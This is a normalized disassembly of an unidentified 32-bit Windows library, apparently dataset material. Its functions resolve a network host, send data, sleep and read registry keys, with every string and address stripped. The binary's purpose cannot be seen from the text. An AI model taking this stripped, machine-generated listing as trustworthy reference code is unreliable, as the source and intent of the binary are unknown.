lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x7
call sub_10008282
mov esi eax
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x48 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
push r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x8
call sub_10001362
mov eax esi
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_1001113e
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x6c ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001362
lea eax [ ebp - 0x48 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0xa
call sub_100110a9
push 0x0
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1000264e
call sub_1002b392
retn
call sub_1000af0a
sub_10013525
push 0x88
mov eax sub_10053304
call sub_1002b30f
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x40 ] eax
call sub_10001362
xor edi edi
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] edi
call sub_10001362
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
push 0x80000002
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014a6c
push edi
push 0x1
lea ecx [ ebp - 0x94 ]
call sub_1000264e
push edi
push 0x1
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
mov esi r--data
push esi
lea ecx [ ebp - 0x5c ]
call sub_10001362
push 0x1
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x5
call sub_10011067
push edi
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
mov ecx [ ebp - 0x40 ]
lea edx [ ebp - 0x3c ]
call sub_10013260
push esi
lea ecx [ ebp - 0x5c ]
call sub_10001362
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
call sub_100110a9
push edi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_1000264e
lea ecx [ ebp - 0x3c ]
call sub_10014b74
call sub_1002b392
retn 0x4
sub_10013604
push 0x248
mov eax sub_10051967
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1fc ] eax
lea eax [ ebp - 0x1f8 ]
push eax
xor ebx ebx
push ebx
push r--data
mov [ ebp - 0x1f8 ] ebx
push r--data
mov [ ebp - 0x1f8 ] ebx
call [ getaddrinfo@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x1f8 ]
cmp eax ebx
jne r-xdata
push eax
lea esi [ ebp - 0x244 ]
call sub_10018f4c
push r--data
mov eax esi
cmp [ eax + 0x18 ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x218 ]
call sub_10001ebc
mov [ ebp - 0x4 ] ebx
mov esi [ eax + 0x18 ]
lea edi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ freeaddrinfo@IAT ]
lea eax [ ebp - 0x1f4 ]
mov [ ebp - 0x1f8 ] ebx
call sub_10019049
lea ecx [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10019128
lea ecx [ ebp - 0x1f4 ]
call sub_1001914a
push 0x10
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x1f4 ]
call sub_10019166
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
push r--data
lea ecx [ ebp - 0x218 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push eax
call sub_1002ae74
push ebx
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x1f4 ]
push eax
call sub_100191a4
push 0xc8
call [ Sleep@IAT ]
push ebx
push 0x20
lea ecx [ ebp - 0x30 ]
call sub_10005cd0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea eax [ ebp - 0x48 ]
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x240 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x240 ]
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x1f4 ]
push eax
call sub_100191ea
cmp eax [ ebp - 0x1c ]
je r-xdata
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x24c ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008282
mov esi eax
lea eax [ ebp - 0x254 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
mov esi [ ebp - 0x1fc ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_100020e2
lea ecx [ ebp - 0x1f4 ]
call sub_100190c8
mov eax esi
call sub_1002b392
retn 0x4
push ebx
push eax
lea ecx [ ebp - 0x30 ]
call sub_1000133e
sub_100137db
push 0x20
mov eax sub_100532be
call sub_1002b2d9
mov esi ecx
mov eax [ ebp + 0x8 ]
push 0x1
push [ ebp + 0xc ]
call sub_10011067
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x2c ]
call sub_10001362
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10011fdd
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_100110a9
call sub_1002b37e
retn 0xc
sub_10013851
push 0x58
mov eax sub_10053344
call sub_1002b30f
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] eax
call sub_10017790
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x3c ]
push 0x1c
cdq
pop ecx
idiv ecx
xor edi edi
test eax eax
jbe r-xdata
lea esi [ ebp - 0x48 ]
call sub_100015ca
push [ ebp - 0x48 ]
call sub_100272e8
pop ecx
call sub_1002b392
retn 0x4
xor esi esi
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x3c ]
add eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_100025cf
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001362
push 0x1
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_100137db
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_1000264e
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x3c ]
push 0x1c
cdq
pop ecx
idiv ecx
inc edi
add esi 0x1c
cmp edi eax
jb r-xdata
call sub_10027827
sub_10013912
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ecx + 0x14 ]
push ebx
push esi
push edi
cmp eax edx
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub edx eax
cmp [ ebp + 0xc ] edx
ja r-xdata
leave
retn 0x8
xor esi esi
inc esi
sub esi [ ebp + 0xc ]
add ecx 0x4
add edx esi
mov esi [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ecx
cmp esi 0x8
jb r-xdata
lea edi [ ecx + eax * 2 ]
mov eax [ ebp + 0x8 ]
movzx ebx [ eax ]
push edx
jmp r-xdata
mov ecx [ ecx ]
push ebx
push edi
call sub_10013b50
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call sub_10006e4f
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov eax esi
sub eax edi
sar eax 0x1
or ecx 0xffffffff
sub ecx eax
add [ ebp - 0x4 ] ecx
push [ ebp - 0x4 ]
lea edi [ esi + 0x2 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov eax esi
sub eax ecx
sar eax 0x1
jmp r-xdata
sub_100139d4
push 0x2c
mov eax sub_10050363
call sub_1002b2a6
mov ecx [ ebp + 0x8 ]
call sub_10001bdf
and [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x38 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
call sub_100259a0
cmp [ ebp - 0x24 ] 0x0
mov edi [ eax ]
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn 0x4
cmp [ ebp - 0x20 ] 0x10
mov eax [ ebp - 0x34 ]
jae r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push eax
lea ecx [ ebp - 0x14 ]
call sub_10008233
cmp [ ebp - 0x20 ] 0x10
mov esi [ ebp - 0x24 ]
mov eax [ ebp - 0x34 ]
jae r-xdata
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x38 ]
push ecx
push eax
lea ecx [ ebp - 0x1c ]
call sub_10008233
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_10006ccf
add eax esi
push eax
lea ecx [ ebp - 0x1c ]
call sub_10006ccf
push eax
call sub_10026280
add esp 0x10
lea eax [ ebp - 0x34 ]
sub_10013a76
push 0x20
mov eax sub_10050bfa
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10002255
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10013b88
mov ecx [ ebp + 0x8 ]
push eax
call sub_10002255
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_10013abd
push 0x20
mov eax sub_10050bfa
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10002255
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_100071fd
mov ecx [ ebp + 0x8 ]
push eax
call sub_10002255
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_10013b08
push 0x20
mov eax sub_10050bfa
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10002255
and [ ebp - 0x4 ] 0x0
push 0xa
push 0x1
mov ecx eax
call sub_100014aa
mov ecx [ ebp + 0x8 ]
push eax
call sub_10002255
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_10013ba5
mov eax [ esp + 0x4 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
test cx cx
je r-xdata
cmp cx 0x5c
jne r-xdata
mov edx [ esp + 0x8 ]
push esi
movzx eax [ eax ]
movzx ecx [ edx ]
pop esi
cmp ax cx
je r-xdata
inc eax
inc eax
inc edx
inc edx
jmp r-xdata
cmp cx 0x2f
jne r-xdata
cmp si 0x2f
je r-xdata
xor eax eax
inc eax
retn
cmp ax 0x5c
jne r-xdata
movzx ecx [ eax ]
movzx esi [ edx ]
cmp cx si
je r-xdata
cmp si 0x5c
jne r-xdata
cmp ax 0x2f
jne r-xdata
cmp cx 0x2f
je r-xdata
xor eax eax
retn
cmp cx 0x5c
je r-xdata
sub_10013c31
push ebx
push esi
mov esi ecx
xor ebx ebx
push ebx
push 0x1
lea ecx [ esi + 0x74 ]
mov [ esi ] r--data
call sub_1000264e
push ebx
push 0x1
lea ecx [ esi + 0x58 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esi + 0x3c ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esi + 0x20 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esi + 0x4 ]
call sub_100020e2
mov [ esi ] r--data
pop esi
pop ebx
retn
sub_10013c7d
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052ac1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi r--data
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
call sub_10001362
xor ebx ebx
push edi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x8c ] ebx
call sub_10001362
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esi + 0x58 ]
lea edx [ esp + 0x44 ]
mov [ esp + 0x8c ] 0x1
call sub_10019252
pop ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx eax
call sub_1001957d
mov edi r--data
mov [ esp + 0x14 ] edi
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esp + 0x2c ]
call sub_1000264e
push ebx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x78 ] 0xf
call sub_100021a7
lea eax [ esp + 0x5c ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esi + 0x74 ]
push esi
mov [ esp + 0x98 ] 0x5
call sub_10013db0
push [ esp + 0x20 ]
lea eax [ esp + 0x60 ]
lea ecx [ esi + 0x4 ]
push eax
call sub_100140a3
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_100020e2
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
call sub_100195e8
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x8
sub_10013db0
push 0x1cc
mov eax sub_10052a79
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x14 ]
xor edi edi
mov [ ebp - 0x80 ] eax
inc edi
push edi
lea eax [ ebp - 0x70 ]
push eax
xor eax eax
mov esi ecx
mov [ ebp - 0x70 ] 0x2f
call sub_10013912
mov [ ebp - 0x70 ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10009533
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x70 ]
sub eax ecx
dec eax
push eax
inc ecx
push ecx
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_10009533
mov esi r--data
push esi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x2
call sub_10001362
push esi
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x74 ]
lea edx [ ebp - 0xd4 ]
lea ecx [ ebp - 0x48 ]
call sub_100192fd
pop ecx
pop ecx
lea ecx [ ebp - 0x78 ]
push ecx
mov ecx eax
call sub_1001957d
mov [ ebp - 0x78 ] r--data
push ebx
push edi
lea ecx [ ebp - 0xd4 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x7
call sub_1000264e
push esi
lea ecx [ ebp - 0xb8 ]
call sub_10001362
push esi
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x8
call sub_10001362
push esi
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x9
call sub_10001362
push r--data
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xa
call sub_10001362
mov [ ebp - 0x4 ] 0xb
mov esi [ ebp - 0x68 ]
lea eax [ esi + 0x20 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
call sub_100098a8
add esp 0xc
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ ebp - 0x10c ]
push ecx
lea ecx [ ebp - 0x128 ]
push ecx
lea ecx [ ebp - 0x78 ]
push ecx
mov ecx eax
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xc
call sub_100193a8
add esp 0x10
lea ecx [ ebp - 0x6c ]
push ecx
mov ecx eax
call sub_1001957d
mov [ ebp - 0x6c ] r--data
push ebx
push edi
lea ecx [ ebp - 0x144 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0xf0 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x128 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x10c ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x12
call sub_1000264e
mov ecx [ ebp - 0x7c ]
push r--data
call sub_10006f6f
push [ ebp - 0x7c ]
lea ecx [ esi + 0x3c ]
lea edx [ ebp - 0x6c ]
call sub_10014619
pop ecx
lea eax [ ebp - 0x1d8 ]
push eax
call sub_100141a4
push 0x800
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x13
call sub_1000d8d3
mov [ ebp - 0x4 ] 0x14
jmp r-xdata
push r--data
lea ecx [ ebp - 0xb8 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x150 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x150 ]
push eax
call sub_1002ae74
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_100194a5
cmp eax ebx
ja r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
lea ecx [ ebp - 0x9c ]
lea eax [ ebp - 0x1d8 ]
call sub_1001420c
mov ecx [ ebp - 0x80 ]
push 0xffffffff
push ebx
push eax
mov [ ebp - 0x4 ] 0x15
call sub_100021c3
push ebx
push edi
lea ecx [ ebp - 0x9c ]
call sub_100020e2
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_100020e2
lea eax [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0x12
call sub_1000b6e6
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x6c ] r--data
call sub_100195e8
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x78 ] r--data
call sub_100195e8
push ebx
push edi
lea ecx [ ebp - 0x64 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
call sub_1002b392
retn 0x10
push eax
push ecx
lea eax [ ebp - 0x1d0 ]
push eax
call sub_100109de
lea ecx [ ebp - 0x28 ]
sub_100140a3
push 0x64
mov eax sub_10050338
call sub_1002b2a6
mov esi ecx
mov ecx [ ebp + 0xc ]
push r--data
call sub_10001e9f
cmp [ esi + 0x18 ] 0x10
mov ecx [ esi + 0x14 ]
lea ebx [ esi + 0x4 ]
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
push esi
call sub_10002255
add edi [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push r--data
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push ecx
push eax
push [ ebp + 0x8 ]
xor eax eax
call sub_10014222
mov edi eax
lea ecx [ ebp - 0x2c ]
cmp edi 0xffffffff
jne r-xdata
push eax
push ebx
push [ ebp + 0x8 ]
lea eax [ edi - 0x1 ]
call sub_10014222
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebx ]
cmp edi eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edi
push eax
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x48 ]
call sub_1000b8f5
mov ecx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100021c3
push 0x0
push 0x1
mov ecx esi
call sub_100020e2
call sub_1002b37e
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_1002ae74
sub_100141a4
push 0x8
mov eax sub_1005139b
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_1000c120
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000c19c
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
sub_10014222
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
jne r-xdata
push ebx
push esi
mov esi [ ecx + 0x14 ]
push edi
cmp eax esi
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub esi eax
cmp [ ebp + 0x10 ] esi
ja r-xdata
leave
retn 0xc
xor edx edx
inc edx
sub edx [ ebp + 0x10 ]
add esi edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ ebp - 0x4 ] ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx eax [ eax ]
push esi
push eax
push ebx
call sub_10027b60
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
lea ebx [ ecx + eax ]
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10027c61
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
sub ebx edi
lea esi [ esi + ebx - 0x1 ]
lea ebx [ edi + 0x1 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov eax edi
sub eax ecx
jmp r-xdata
sub_100142be
push 0x40
mov eax sub_1004fe64
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_100021a7
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_10002255
lea ecx [ ebp - 0x48 ]
mov edx [ eax + 0x20 ]
cmp [ edx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add ecx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000dd07
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000dd07
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10002255
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_100020e2
mov eax ebx
call sub_1002b392
retn 0x4
sub_10014374
push 0xcc
mov eax sub_1005090d
call sub_1002b30f
mov esi ecx
xor ebx ebx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] ebx
call sub_10001bdf
lea ecx [ esi + 0x1c ]
call sub_10001bdf
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x40 ] edi
call sub_10001362
push r--data
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] edi
call sub_10001362
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push 0x80000001
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push ebx
push edi
lea ecx [ ebp - 0xb0 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001362
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10014b9d
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100150f9
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0x78 ]
call sub_1000264e
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x6
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001362
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10014b9d
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0xa
call sub_100150f9
push 0xffffffff
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0x3c ]
push ebx
push eax
add ecx 0x1c
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0x78 ]
call sub_1000264e
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x9
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0x5c ]
call sub_1000264e
lea ecx [ ebp - 0x38 ]
call sub_10014b74
mov eax [ ebp - 0x3c ]
call sub_1002b392
retn
sub_100144ff
push 0xac
mov eax sub_100510fa
call sub_1002b30f
mov edi ecx
push r--data
lea ecx [ ebp - 0x74 ]
call sub_10001362
xor ebx ebx
push r--data
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] ebx
call sub_10001362
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
push 0x80000001
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014a6c
push ebx
push 0x1
lea ecx [ ebp - 0x90 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
push r--data
lea ecx [ ebp - 0x58 ]
call sub_10001362
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001517a
pop ecx
pop ecx
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10014f5b
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x5
call sub_100150b1
push ebx
push 0x1
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
push r--data
